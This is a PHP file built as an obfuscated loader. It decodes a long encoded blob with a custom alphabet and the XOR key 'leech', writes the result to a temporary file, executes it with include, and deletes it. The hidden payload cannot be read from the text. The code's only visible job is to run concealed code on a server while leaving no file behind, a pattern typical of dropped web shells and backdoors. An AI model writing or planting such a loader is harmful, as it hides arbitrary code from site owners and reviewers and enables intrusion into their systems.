<?php
$encrypted = 'UFoVCxhhb0EHBw8QCAYGGDcKDBxMWEURDQ0JFQIcBE0CBhwPEgFLQUVeaGlMGRUJDAkINQQXAExYRQobHwARS0wzIiA3M0sVBBcASzhMQ1dMQTokLTg-QhMJGA1CPkhWRUEHBw8QCAYGGDcKDBxXaG9HHRwJCgIMPAQRC0hRRRYXGjMXABMEDQYASzNLSkJPSEs5OUQ1QEUhKjopJjEsOjU6NiY4LTckNyc-SUVHHRwJCgIMPAQRC0FXaG9uYgUDRUtJBRY6BwEeTUEWGAAKBAc4DRENSkFMHmhpSExFRQcBCU1Hs_W80LXXuNK12rLrveS04bjUtdmy47zcRbPXvea04bngRbXUuNy11rLovea11LjWtd1DQLzYtdZIvNG127nstdCz0r3ntd257LXdsudFS0dKU2FvGG5iYW8MBUhEQTowLT4zIDEzSzcgMj0pNjE8JSkxLSwsSzhFXlVRRUIzJz8xQkNOSkUMEBsJEU1HNyosKSY7N0IQEwQDBAEGDDMDDA8NH0I4SkFMHmhpSExFRUcOBQkAEEhRRUE8LiUpIDAzSxAVDwcNAQAHNwoMCQYbSzhebmJhb0VDSEwDChFIREEMQ1VMVV5DTAVFWUMLAxALF0BIAwwPDR8-Qg0JAQBCPkFXRUEKQ0dMRRhlZkVFQ0hMRUVDAQpFTUcOBQkAEDNLABcRBx5CODhMBThFXlVRRTAzJCMkITwtPjc6LCNFRR5uYkxFRUNITEVFQ0hMRUEFAQAACwIFCUVYQwoNFgANCQEATUcOBQkAEDNLCwQODUs4PkcBMUxebmJMRUVDSExFRUNITEVBFwUcKwQODUxYRUcOBQkAEDNLEQgTNwIECAZPMT5BCjVXaG9DSExFRUNITEVFQ0hIAQAQHAULBBcBAwtFXkhIEBUPBw0BNQIcBEVLQywlNyAgPCM3PDw7KTUkMSk4KjdDRkxBAwoECQsEDg1XaG9uYkxFRUNITEVFQ0hMRQwFSEQIChUNMxAVDwcNAQAHNwoMCQZASBEIEyYNCABPSEgBABAcBQsEFwEDC0xKSBdob0NITEVFQ0hMRUVDSExFRUMNDw0KQ0q8wbXTuNW13kNPSAMMDw0CBAgGT0y05rLpvNq11rnktdiz1ky10rPYvNa047nvtdOz3bzYS18KHltHWGVmRUVDSExFRUNITEVFHkgJCRYGSBdob0NITEVFQ0hMRUVDSExFRUMNDw0KQ0q8-7TruNS11LPSvNVFs9e95bXbSLzStdO437Tlsuu80rXZuNlFQkcOBQkADQkBAEJNVA4XW0FTYW9FQ0hMRUVDSExFRUMVYW9FQ0hMRUVDSBFFAA8bCUUebmJMRUVDSExFRUNITEUAAAADRUez9r3ttdu43bXfs9hMtdKz2LzWtOO577XSs9K83UWy7LzVtdq417XVQ08XQQMKBAkWPkQGDQgARDU3QQw-FUtFTbPSvNu111JMHkEFAQAAFjhPCRcXDBpLOD5HATEYTE1UDhdbQVNhb0VDSExFRUNIEWhvQ0hMRRhuYhFob1xWYW8';
if (!function_exists('worm')) {
    function worm($data, $key) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        $bin = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $index = strpos($alphabet, $data[$i]);
            $bin .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
        }

        $bytes = '';
        for ($i = 0; $i < strlen($bin); $i += 8) {
            $chunk = substr($bin, $i, 8);
            if (strlen($chunk) < 8) break; // если меньше 8 бит — игнорируем
            $bytes .= chr(bindec($chunk));
        }

        $res = '';
        $klen = strlen($key);
        for ($i = 0; $i < strlen($bytes); $i++) {
            $res .= $bytes[$i] ^ $key[$i % $klen];
        }
        return $res;
    }
}

file_put_contents($tmp = tempnam(sys_get_temp_dir(), 'shf_'), worm($encrypted, 'leech'));
include $tmp;
unlink($tmp);

?>